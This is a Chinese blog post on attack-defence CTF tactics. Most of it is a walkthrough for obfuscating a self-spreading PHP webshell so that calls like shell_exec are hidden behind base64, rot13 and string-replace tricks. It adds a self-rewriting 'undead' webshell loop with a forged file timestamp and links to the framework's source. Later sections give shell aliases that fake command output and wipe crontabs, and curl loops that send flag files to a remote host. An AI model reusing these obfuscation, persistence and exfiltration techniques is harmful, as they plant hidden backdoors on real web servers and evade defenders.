原创：3s_NWGeek合天智汇

原创投稿活动：[重金悬赏 |
合天原创投稿等你来](http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Nw2VDyvCpPt_GG5YKTQuUQ)

蠕虫webshell虽然功能比较复杂，但是看懂了代码还是有机会进行防御和被他人利用的，还是有必要进行代码混淆的。

历史文章：
蠕虫webshell代码功能详情：[《基于AWD比赛的蠕虫webshell(一)》](https://mp.weixin.qq.com/s/8jrb_q8oysSfC2CC6m13bw)
蠕虫webshell复活框架：[《基于AWD比赛的蠕虫webshell(二)》](https://mp.weixin.qq.com/s/R9TDu5QdUnPUtfV-_v0iCw) 蠕虫webshell适配msf、前端传播与反渗透
：[《基于AWD比赛的蠕虫webshell(三)》](https://zhuanlan.zhihu.com/write)

## 0x00 蠕虫webshell代码混淆  

先说混淆后的效果，报1级变量函数，但考虑到蠕虫webshell是要每个php文件都要插入这么大段代码，大家都是做安全的明白人应该知道这个有问题，所以暂时达到混淆的目的，免杀就不多考虑了。

![v2-f3c996e1bdf432b22773265f2baac521_hd.p](https://pic2.zhimg.com/80/v2-f3c996e1bdf432b22773265f2baac521_hd.png)

混淆后总体效果，仅只有1行代码：

![v2-2e41ef40d1850c6ea32c94e91565a14e_hd.p](https://pic4.zhimg.com/80/v2-2e41ef40d1850c6ea32c94e91565a14e_hd.png)

混淆解释和原理：
定义一个包含str_replace的字符串，加入混淆字符串mR3s，后面使用str_replace替换mR3s中间字符,就会剩下str_replace了，
<?php $assd='mR3sstmR3sr_mR3sreplamR3scmR3semR3s'; 后面会使用这个变量来替代更多函数。
$JuGjDjgsM=str_replace('mR3s', '', $assd);//str_replace

蠕虫webshell后面会检查第一行是否存在此检索字符，否则重复写入蠕虫webshell $author = '3s_NwGeek';

后面定义两个关键的编码和加密函数base64_decode和str_rot13

$saddd='bup4Tasup4Te6up4T4_dup4Teup4Tcode';// base64_decode混淆字符串
$osmHO='c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEz'; //str_rot13混淆字符串

变量可以通过变量函数写出来一些字符串编码或者换位的函数

$JuGjDjgsM=str_replace('mR3s', '', $assd);//str_replace
$KjHggsG=$JuGjDjgsM('up4T','',$saddd);//base64_decode
$PLiskmr=$JuGjDjgsM('pOke4tf','',$KjHggsG($osmHO));//str_rot13
$sAtArR4E4V=$JuGjDjgsM('kks','',$KjHggsG('c3Rra3NycmVra3N2'));//strrev()

有了以上的字符串处理函数，可以写一个加解密函数方便后续写代码

可以写出一个加密函数: str_replace(‘=’,$osmHO,strrev(base64_encode(str_rot13(“明文”))))

function encr($text){ global $JuGjDjgsM,$PLiskmr,$sAtArR4E4V,$osmHO; return
$JuGjDjgsM('=',$osmHO,$sAtArR4E4V(base64_encode($PLiskmr($text)))); }

由上再写一个解密函数: str_rot13((base64_decode(strrev(str_replace(‘=’,$osmHO,密文)))

if (!function_exists('O0o0OOo')) { function O0o0OOo($enc){ global
$JuGjDjgsM,$PLiskmr,$sAtArR4E4V,$KjHggsG,$osmHO; return
$PLiskmr($KjHggsG($sAtArR4E4V($JuGjDjgsM($osmHO,'=',($enc))))); }}

蠕虫webshell中可以通过解密函数，把自己加密好的密文用蠕虫webshell中解密函数解出来，作为变量函数去调用。

if (!function_exists('O0o0OOo')) { function O0o0OOo($enc){ global
$JuGjDjgsM,$PLiskmr,$sAtArR4E4V,$KjHggsG,$osmHO; return
$PLiskmr($KjHggsG($sAtArR4E4V($JuGjDjgsM($osmHO,'=',($enc))))); }}

由以上变量编码替换和rot13可以得到： create_function

$Oo0oO=O0o0OOo('hJmdnBXYoN3XydmbyVGc');//create_function

function O0o0OOo()解密函数

$oOoOo=O0o0OOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzc3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzgYCJEMiBjQ');//function
O0o0OOo()解密函数

我们通过之前的加密函数加密好的字符串，再用上面这个function O0o0OOo()解密函数解密出来定义为变量。 就可以得出： is_dir

$oOOOOo=O0o0OOo('lZXcfZmd');//is_dir

opendir

$oOO0Oo=O0o0OOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzc3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzQZ2FXYyNmY');//opendir

readdir

$o0O0O0=O0o0OOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzc3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzQZ2FXcuJXZ');//readdir

closedir

$o000O0=O0o0OOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzUmdxJnZilHc');//closedir

fputs

$Oo00O0=O0o0OOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzY2ZoN2c');//fputs

fopen

$Oo0oO0=O0o0OOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzEmcjJ2c');//fopen

fget

$O00oo0=O0o0OOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzY2ZyR3c');//fget

fclose

$Oo0oo0=O0o0OOo('yZmY5B3c');//fclose

fwrite

$Oo00=O0o0OOo('ydmdlp2c');//fwrite

chr

$Oo0ooo=O0o0OOo('lVHc');//chr

shell_exec

$O00o0=O0o0OOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzc3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzAcytmcflXeyVnZ');//shell_exec

rawurlencode

$Oooooo=O0o0OOo('yFnYwFmc5VGaq5WZ');//rawurlencode

'192.168.3.1'

$b =
$oOoOo('c3BPa2U0dGZ0cnBPa2U0dGZfc**wT2tlNHRmdDEzEjLz4CO2EjLykTM');//'192.168.3.1'

## 0x01 混淆效果  

然后把危险函数给替换掉，去掉缩进换成1行，把变量命名得难分辨效果如下图。

![v2-0c2787272107e79b78d211cef2d89a83_hd.p](https://pic4.zhimg.com/80/v2-0c2787272107e79b78d211cef2d89a83_hd.png)

## 0x02 不死蠕虫webshell  

混淆之后，为了更好地维持权限，我再嵌套了大家常用的不死马，成为不死蠕虫webshell，测试过并没有影响功能的。

<?php set_time_limit(0); ignore_user_abort(1); while(1){
file_put_contents(__FILE__,base64_decode(' 这里填充base64_encode(混淆后的蠕虫webshell代码)
')); touch(__FILE__,mktime(20,15,1,11,28,2017)); usleep(100); } ?>

到这里蠕虫webshell就告一段落了，有需要可以蠕虫webshell框架源码可以在github下载
<https://github.com/3sNwgeek/awd_worm_phpwebshell_framework/>。

## 谈谈awd攻防赛几个有趣的技巧  

## 一、alias别名 (权限)  

对方执行whoami命令的时候回显就是Excute fail

alias whoami="echo 'Excute fail'"

![v2-15319d527b63780be5a40c670d3897a2_hd.p](https://pic1.zhimg.com/80/v2-15319d527b63780be5a40c670d3897a2_hd.png)

对方执行cat /flag 命令的时候回显就是错误flag

alias cat="echo `date`|md5sum|cut -d ' ' -f1||"

![v2-1632e240dd5a9c2a993a1119e4141f13_hd.p](https://pic3.zhimg.com/80/v2-1632e240dd5a9c2a993a1119e4141f13_hd.png)

对方执行crontab命令的时候回显就是no crontab for 当前用户

crontab -r alias crontab="echo no crontab for `whoami` ||"

![v2-8087e74a7781eb2e7b46f691f61326c4_hd.p](https://pic4.zhimg.com/80/v2-8087e74a7781eb2e7b46f691f61326c4_hd.png)

其次还可以帮其他人服务器清除计划任务，减少分值被平分的机会。

替换命令，其他攻击者不知道更改命令，getflag操作可能不成功 注意是www-data权限，和比赛得到的xctf权限都最好替换 防：使用绝对路径执行命令
/usr/bin/cat /flag

## 二、获取getflag方式和提交flag方式信息  

常见比赛getflag方式有两种: 1. 储存在靶机本地根目录或网站根目录 2. 需要在靶机http访问flag服务器

根据以上两种getflag方式，有以下2种submit flag方式 1. 带token get/post请求 curl
http://flag.host/submit.php?flag={xxx}&token=xxx curl
http://flag.host/submit.php -d flag={xxx}&token=xxx 2. 带cookie get/post请求 curl
http://flag.host/submit.php?flag={xxx} -H cookie:xxx

根据这些getflag和submit flag方式，在实战中又可以区分为两种方式完成： 一般情况下比赛靶机为linux

>  
>

  1. 靶机getflag+攻击机submit flag   

靶机命令执行返回flag再使用py脚本批量提交

>  
>

  1. 靶机getflag&submit flag(重点推荐)   

我在比赛中主要使用这种方式每隔2分钟循环提交flag一次。 flag在本地获取再提交 curl
http://flag.host/submit.php?flag=$(cat /var/www/html/flag)&token=xxx -H
cookie:xxx

flag在flag机获取再提交 curl http://flag.host/submit.php?flag=$(curl
http://flag.host/getflag.php)&token=xxx -H cookie:xxx

插上一个循环就可以一劳永逸了，除非对手重置环境或者服务，不然是一直提交的。 'while true;do curl
http://flaghost/submit_flag/ -d "flag=$(cat
/var/www/html/flag.txt)&token=666";sleep 60;done;'

## 三、捕获别人flag token  

如果比赛有限制提交flag次数（防爆破），本地抓流量如果别人在靶机本地用token提交flag，可以利用别人flag
token发送超限次数，导致当轮该token无法再提交更多flag（一般限制次数一千），就是比赛方也没有明令禁止不能用别人的token交flag，战术犯规。

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

  

